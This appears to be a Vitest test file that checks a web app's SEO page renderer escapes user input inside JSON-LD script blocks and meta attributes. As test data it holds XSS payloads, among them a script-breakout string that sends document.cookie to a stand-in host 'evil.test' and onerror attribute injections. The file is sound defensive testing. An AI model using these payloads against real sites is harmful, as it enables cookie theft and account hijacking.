import { beforeAll, describe, expect, it, vi } from 'vitest';

/*
 * renderSeoContent.ts registers Cloud Functions and grabs a Firestore handle at
 * module scope, neither of which exists in a test process. Stub both so the
 * module can be imported for what this file actually cares about: the escaping
 * that stands between a crawler-facing page and stored user input.
 *
 * These mocks are hoisted above the import below by vitest.
 */
vi.mock('firebase-admin', () => ({
    firestore: () => ({ collection: () => ({}) }),
    initializeApp: () => ({}),
    apps: [],
}));
vi.mock('firebase-functions/v2/https', () => ({
    onRequest: (_opts: unknown, handler: unknown) => handler,
}));
vi.mock('firebase-functions/v1', () => {
    // Reached transitively via ../publicJobFeed, which builds its function with
    // the chainable v1 builder: functions.region(...).runWith(...).https.onRequest.
    const builder: any = {
        runWith: () => builder,
        region: () => builder,
        https: { onRequest: (h: unknown) => h, onCall: (h: unknown) => h },
    };
    return { ...builder, default: builder };
});

type Renderer = typeof import('./renderSeoContent');
let escapeJsonForHtml: Renderer['escapeJsonForHtml'];
let buildHtml: Renderer['buildHtml'];

beforeAll(async () => {
    ({ escapeJsonForHtml, buildHtml } = await import('./renderSeoContent'));
});

/*
 * The payload a real attacker uses. Every field rendered into this page comes
 * from a document the attacker owns — a resume's professionalSummary, a
 * community post title, a display name — and the page is served from
 * careervivid.app, so anything that executes here executes with that origin's
 * cookies and localStorage.
 */
const BREAKOUT = '</script><script>fetch("https://evil.test?c="+document.cookie)</script>';

describe('escapeJsonForHtml', () => {
    it('never emits the character sequence that closes a script block', () => {
        const json = escapeJsonForHtml({ name: BREAKOUT });

        // Case-insensitive: the HTML parser ends the block on </SCRIPT too.
        expect(json.toLowerCase()).not.toContain('</script');
        expect(json).not.toContain('<');
        expect(json).not.toContain('>');
    });

    it('is still valid JSON that parses back to the exact original value', () => {
        const original = {
            name: BREAKOUT,
            nested: [{ description: '5 > 3 && 2 < 4', url: 'https://x.test/?a=1&b=2' }],
        };

        // The whole point of \uXXXX over HTML entities: nothing is lost. If this
        // used esc(), `name` would come back containing "&lt;/script&gt;".
        expect(JSON.parse(escapeJsonForHtml(original))).toEqual(original);
    });

    it('escapes the characters that break out, and only as \\u sequences', () => {
        expect(escapeJsonForHtml('<')).toBe('"\\u003c"');
        expect(escapeJsonForHtml('>')).toBe('"\\u003e"');
        expect(escapeJsonForHtml('&')).toBe('"\\u0026"');
        expect(escapeJsonForHtml('\u2028')).toBe('"\\u2028"');
        expect(escapeJsonForHtml('\u2029')).toBe('"\\u2029"');
    });

    it('leaves a backslash the data really contained unambiguous', () => {
        // JSON.stringify doubles it first, so our added sequences can never be
        // read as literal text the user supplied — and vice versa.
        expect(JSON.parse(escapeJsonForHtml('a\\u003cb'))).toBe('a\\u003cb');
    });

    it('cannot be closed by an HTML comment either', () => {
        expect(escapeJsonForHtml({ t: '<!--' })).not.toContain('<!--');
        expect(escapeJsonForHtml({ t: '-->' })).not.toContain('-->');
    });
});

describe('buildHtml', () => {
    const page = (overrides: Partial<Parameters<Renderer['buildHtml']>[0]> = {}) => buildHtml({
        title: 'Title',
        description: 'Description',
        canonicalUrl: 'https://careervivid.app/shared/u1/r1',
        imageUrl: 'https://careervivid.app/og.png',
        structuredData: { '@context': 'https://schema.org' },
        bodyContent: '<p>body</p>',
        siteSuffix: '',
        ...overrides,
    });

    it('does not let structured data open a second script tag', () => {
        const html = page({
            structuredData: {
                '@context': 'https://schema.org',
                '@type': 'ProfilePage',
                mainEntity: { '@type': 'Person', name: BREAKOUT },
            },
        });

        // Exactly one script element on the page: the ld+json block itself. The
        // payload text still appears — as inert JSON string content, which is
        // the point — so the assertion is about tag structure, not substrings.
        expect(html.match(/<script/gi)?.length).toBe(1);
        expect(html.match(/<\/script/gi)?.length).toBe(1);

        // Everything up to the FIRST </script> is the whole block: nothing
        // terminated it early, so no second script was ever opened.
        const block = html.slice(
            html.indexOf('<script type="application/ld+json">') + '<script type="application/ld+json">'.length,
            html.indexOf('</script>'),
        );
        expect(JSON.parse(block).mainEntity.name).toBe(BREAKOUT);
    });

    it('keeps the structured data readable to a crawler after escaping', () => {
        const html = page({
            structuredData: { '@type': 'Person', name: 'Ada <Lovelace> & Co' },
        });

        const block = html.match(/<script type="application\/ld\+json">([\s\S]*?)<\/script>/);
        expect(block).not.toBeNull();
        expect(JSON.parse(block![1])).toEqual({ '@type': 'Person', name: 'Ada <Lovelace> & Co' });
    });

    it('escapes imageUrl in both og:image and twitter:image', () => {
        // pd.photo / post.coverImage / user.photoURL are user-supplied strings,
        // not validated URLs, so a quote here escapes the attribute.
        const html = page({ imageUrl: 'https://x.test/a.png" onerror="alert(1)' });

        expect(html).not.toContain('onerror="alert(1)"');
        expect(html).toContain('<meta property="og:image" content="https://x.test/a.png&quot; onerror=&quot;alert(1)" />');
        expect(html).toContain('<meta name="twitter:image" content="https://x.test/a.png&quot; onerror=&quot;alert(1)" />');
    });

    it('escapes canonicalUrl, which is built from request path segments', () => {
        // e.g. /whiteboard/{id} — the id reaches canonicalUrl straight from the URL.
        const html = page({ canonicalUrl: 'https://careervivid.app/whiteboard/a"><img src=x onerror=alert(1)>' });

        expect(html).not.toContain('<img');
        expect(html).toContain('&quot;&gt;&lt;img');
    });

    it('still escapes title and description', () => {
        const html = page({ title: '<b>t</b>', description: '"d"' });

        expect(html).toContain('<title>&lt;b&gt;t&lt;/b&gt;</title>');
        expect(html).toContain('content="&quot;d&quot;"');
    });
});
